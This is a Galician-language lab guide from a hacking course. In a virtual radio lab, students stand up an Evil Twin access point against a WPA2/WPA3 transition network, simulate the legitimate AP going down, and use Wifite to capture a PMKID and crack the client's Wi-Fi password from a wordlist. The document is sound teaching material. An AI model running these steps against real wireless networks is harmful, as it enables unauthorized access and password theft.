# Práctica Wifite 3.3 — WPA3-SAE en modo transición: Evil Twin e auditoría WPA2-PSK

!!! warning "Laboratorio autorizado"
    Esta práctica execútase exclusivamente no laboratorio virtual `vuln-wifi.lab`, con radios `mac80211_hwsim` e puntos de acceso creados polo propio escenario. A indispoñibilidade do AP lexítimo **simúlase detendo o seu proceso `hostapd`**; non se realiza un ataque DoS real.

!!! info "Referencia docente"
    `3-Taller-HE-Practica-WiFi-3.pdf`, especialmente as páxinas 10–18. A [práctica 3.3](./3.3-ATAQUE_WPA3_DoS_WPA2_EVIL_TWIN.md) realiza a captura e a auditoría con Aircrack-ng; aquí empregaremos **Wifite** e un directorio de traballo limpo.

## 1. Obxectivo

Identificar **dous AP co mesmo SSID `EMPRESA-XYZ`**, distinguir o lexítimo do Evil Twin polo seu BSSID e comprobar como a desaparición do AP lexítimo leva o cliente configurado en modo transición a **intentar autenticarse por WPA2-PSK** no Evil Twin. Empregar Wifite para obter material de autenticación e recuperar o contrasinal do cliente mediante dicionario.

No laboratorio comprobouse a captura dun **PMKID** e a recuperación de **`spongebob19`** mediante Wifite. O intento posterior de capturar un *4-Way Handshake* rematou aos 300 segundos sen éxito. Son dúas fases distintas.

## 2. Topoloxía e material

| Terminal | Compoñente | Interface | *Namespace* |
|---|---|---|---|
| **1** | AP lexítimo en modo transición WPA2/WPA3; comprobación do Evil Twin | `wlan0` / `wlan2` | `phy0_wlan0` / `evil_twin_wlan2` |
| **2** | Cliente lexítimo que admite SAE e WPA-PSK | `wlan1` | `phy1_wlan1` |
| **3** | Wifite, escaneo e auditoría | `wlan3` | Global |

O escenario crea **catro radios virtuais**. Wifite debe traballar con `wlan3`, sen mover nin deter os dispositivos dos outros *namespaces*.

| Elemento | Configuración |
|---|---|
| AP lexítimo | `EMPRESA-XYZ`, `WPA-PSK SAE`, clave `spongebob19` |
| Cliente | `EMPRESA-XYZ`, admite `SAE WPA-PSK`, clave `spongebob19` |
| Evil Twin | `EMPRESA-XYZ`, só `WPA-PSK`, clave `calqueracousa` |

O contrasinal **que se pretende descubrir** é `spongebob19`, o utilizado polo cliente. O Evil Twin emprega deliberadamente outra clave porque o atacante descoñece a verdadeira. Non se debe igualar a clave do AP falso á do cliente.

!!! note "PMF e estado da conexión"
    O cliente inicia a práctica conectado ao AP lexítimo **mediante SAE**, con PMF negociado. No BSS de transición `ieee80211w=1` indica PMF opcional, e `sae_require_mfp=1` esíxeo para SAE. A protección da asociación SAE anterior non impide que o cliente **tente** autenticarse nun AP que só ofrece WPA2-PSK. Cando as PSK son diferentes, poden producirse asociacións e mensaxes EAPOL sen chegar ao estado `wpa_state=COMPLETED`. **Asociarse non equivale a completar a autenticación.**

## 3. Procedemento

### 3.1. Terminal 1 — Iniciar o escenario

```bash
sudo wifilabctl up wpa3_sae_vulnerable
sudo wifilabctl status
```

Comprobar que os AP están activos e anotar os seus BSSID, que poden cambiar ao reiniciar:

```bash
LAB=/home/kali/wifiLab/run/wpa3_sae_vulnerable

sudo grep -E '^(ssid|channel|wpa_key_mgmt|ieee80211w|sae_require_mfp|wpa_passphrase|sae_password)=' \
  "$LAB/hostapd.conf"
sudo grep -E '^(ssid|channel|wpa_key_mgmt|ieee80211w|wpa_passphrase)=' \
  "$LAB/hostapd_eviltwin.conf"

AP_BSSID=$(sudo ip netns exec phy0_wlan0 iw dev wlan0 info | awk '$1=="addr" {print tolower($2); exit}')
EVIL_BSSID=$(sudo ip netns exec evil_twin_wlan2 iw dev wlan2 info | awk '$1=="addr" {print tolower($2); exit}')
printf 'Lexítimo: %s\nEvil Twin: %s\n' "$AP_BSSID" "$EVIL_BSSID"
```

### 3.2. Terminal 2 — Comprobar a conexión SAE inicial

```bash
sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 status
```

Comprobar `key_mgmt=SAE`, `wpa_state=COMPLETED` e que `bssid=` coincide co AP lexítimo. É o estado **anterior** á caída simulada do AP.

### 3.3. Terminal 3 — Preparar Wifite sen reutilizar capturas

Crear un directorio novo para a proba. Así non dependemos de `hs/`, `cracked.json` nin resultados de prácticas anteriores:

```bash
DIR="$HOME/proba-wifite-3.3-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$DIR"
cd "$DIR"
pwd
ls -la
```

Comprobar que existe o dicionario:

```bash
ls -lh /usr/share/wordlists/rockyou.txt
```

Se só existe `rockyou.txt.gz`, descomprimilo unha vez:

```bash
sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
```

**Iniciar Wifite sen o filtro `--wpa` nin `--wpa3`**, para ver simultaneamente os AP clasificados como `WPA3-S` e `WPA2-P`:

```bash
sudo wifite -i wlan3 -c 6 --showb --no-wps \
  --new-hs --dict /usr/share/wordlists/rockyou.txt \
  --hs-dir "$PWD/hs" --wpat 300
```

`--showb` permite identificar os AP por BSSID; `--new-hs` evita reutilizar capturas anteriores e `--hs-dir` sitúa as novas capturas neste directorio. Non usar `airmon-ng check kill`, `wifite --kill` nin `wifilabctl down`: poderían interromper os servizos do escenario.

### 3.4. Terminal 3 — Identificar os dous AP e seleccionar o Evil Twin

Na listaxe inicial de Wifite deben aparecer **dous AP co SSID `EMPRESA-XYZ`**, pero con **BSSID diferentes**:

```text
NUM    ESSID          BSSID               CH   ENCR
1      EMPRESA-XYZ    <BSSID_LEXITIMO>    6    WPA3-S
2      EMPRESA-XYZ    <BSSID_EVIL_TWIN>   6    WPA2-P
```

Os números son ilustrativos: Wifite pode ordenar os AP de maneira diferente. Comparar os BSSID cos obtidos na terminal 1.

1. **Premer `Ctrl+C` unha soa vez** para rematar o escaneo e acceder a `Select target(s)`; non se sae de Wifite.
2. **Seleccionar o número correspondente ao BSSID do Evil Twin (`WPA2-P`)** e premer Intro. Non seleccionar o AP SAE lexítimo.
3. **Deixar Wifite traballando**. Comezará os seus intentos de obtención de material WPA2, incluída a fase PMKID, e pode continuar despois coa captura dun *handshake*.

### 3.5. Terminal 1 — Simular a caída do AP lexítimo

Unha vez seleccionado o Evil Twin en Wifite, deter **só** o `hostapd` pertencente ao AP lexítimo:

```bash
for pid in $(sudo ip netns pids phy0_wlan0); do
    if [ "$(cat /proc/"$pid"/comm 2>/dev/null)" = 'hostapd' ]; then
        echo "Detendo AP lexítimo: PID=$pid"
        sudo kill -TERM "$pid"
    fi
done
```

O Evil Twin debe seguir activo:

```bash
sudo ip netns exec evil_twin_wlan2 iw dev wlan2 info
sudo grep 'AP-ENABLED' "$LAB/hostapd_eviltwin.log"
```

A caída é unha **simulación controlada**, non unha explotación real de Dragondrain nin unha función de Wifite.

### 3.6. Terminal 2 — Comprobar a tentativa de conexión ao Evil Twin

Co AP lexítimo detido e o Evil Twin dispoñible, provocar unha nova selección de rede:

```bash
sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 disconnect
sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 pmksa_flush
sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 reconnect

sleep 8
sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 status
sudo ip netns exec phy1_wlan1 iw dev wlan1 link
```

Comprobar nos logs do AP falso os intentos de autenticación ou asociación:

```bash
sudo grep -E 'authenticated|associated|POSSIBLE-PSK-MISMATCH|EAPOL|deauthenticated' \
  /home/kali/wifiLab/run/wpa3_sae_vulnerable/hostapd_eviltwin.log | tail -n 50
```

Co AP lexítimo fóra de servizo, o cliente configurado con `SAE WPA-PSK` pode **seleccionar e intentar asociarse ao Evil Twin WPA2-PSK**. Debido á diferenza de contrasinais, non se debe dar por suposto que a conexión remate en `COMPLETED`. Para a auditoría abonda con que Wifite obteña material criptográfico verificable.

### 3.7. Terminal 3 — Capturar PMKID e recuperar o contrasinal

Deixar que Wifite complete os intentos sobre o Evil Twin seleccionado. Na **proba realizada desde un directorio novo**, o resultado observado foi:

```text
(1/1) Starting attacks against C6:0F:2D:91:B6:83 (EMPRESA-XYZ)
EMPRESA-XYZ (72db) PMKID CAPTURE: Captured PMKID
EMPRESA-XYZ (72db) PMKID CRACK: Cracking PMKID using /usr/share/wordlists/rockyou.txt ...
EMPRESA-XYZ (72db) PMKID CRACKED: Key: spongebob19

Access Point Name: EMPRESA-XYZ
Access Point BSSID: C6:0F:2D:91:B6:83
Encryption: PMKID
PSK (password): spongebob19
```

**Este é o resultado conseguido na práctica: Wifite recuperou `spongebob19` mediante PMKID** sen reutilizar as capturas das prácticas anteriores. O BSSID do exemplo é o desa execución e pode ser diferente ao reiniciar o escenario.

Wifite proseguiu coa captura dun *handshake* WPA2, pero esa segunda fase rematou así:

```text
EMPRESA-XYZ (72db) WPA handshake capture FAILED: Timed out after 300 seconds
Finished attacking 1 target(s), exiting
```

**Non hai contradición:** recuperouse a clave mediante PMKID, aínda que Wifite non obtivese posteriormente un *handshake* que aceptase como válido. A práctica manual 3.3 conseguiu tamén recuperar `spongebob19`, pero mediante captura EAPOL e Aircrack-ng.

### 3.8. Verificar os resultados gardados

Desde o directorio no que se iniciou Wifite:

```bash
pwd
find "$PWD/hs" -maxdepth 2 -type f -print 2>/dev/null
sudo wifite --cracked
```

!!! note "Interpretación correcta"
    A secuencia didáctica é: **dous AP visibles → seleccionar o Evil Twin polo BSSID → simular a caída do AP lexítimo → observar a tentativa WPA2 do cliente → capturar o PMKID → recuperar `spongebob19`**. A pantalla de Wifite confirma a recuperación da clave sobre o BSSID seleccionado, pero, sen examinar a traza temporal e o PMKID, non demostra por si soa en que instante se xerou ese PMKID nin que a caída do AP fose imprescindible para capturalo. A ferramenta non realiza por si soa un ataque de *downgrade* nin rompe directamente SAE.

## 4. Resultado da práctica

| Comprobación | Resultado |
|---|---|
| Dous AP co mesmo SSID | **Observados:** `WPA3-S` e `WPA2-P`, con BSSID diferentes |
| AP lexítimo detido | Caída simulada de `hostapd`; Evil Twin permanece dispoñible |
| Cliente | Tentativa de autenticación WPA2 no Evil Twin tras a desaparición do lexítimo |
| Captura do PMKID con Wifite | **Conseguida** nun directorio novo |
| Recuperación por dicionario | **Conseguida:** `PMKID CRACKED: Key: spongebob19` |
| Captura posterior do *4-Way Handshake* con Wifite | **Non conseguida:** tempo esgotado aos 300 s |

**Conclusión:** a práctica Wifite 3.3 permite observar o risco do modo transición WPA2/WPA3: un cliente que admite SAE tamén pode tentar autenticarse mediante WPA2-PSK ante un AP co mesmo SSID. No laboratorio, **Wifite recuperou `spongebob19` a partir dun PMKID**; non se explotou directamente WPA3-SAE, nin se completou a captura posterior do *handshake* con Wifite.

## 5. Restaurar o laboratorio

```bash
sudo wifilabctl up wpa3_sae_vulnerable
sudo wifilabctl status
```

**Referencias:** [Práctica manual 3.3](./3.3-ATAQUE_WPA3_DoS_WPA2_EVIL_TWIN.md) · [Wifite2](https://github.com/derv82/wifite2).
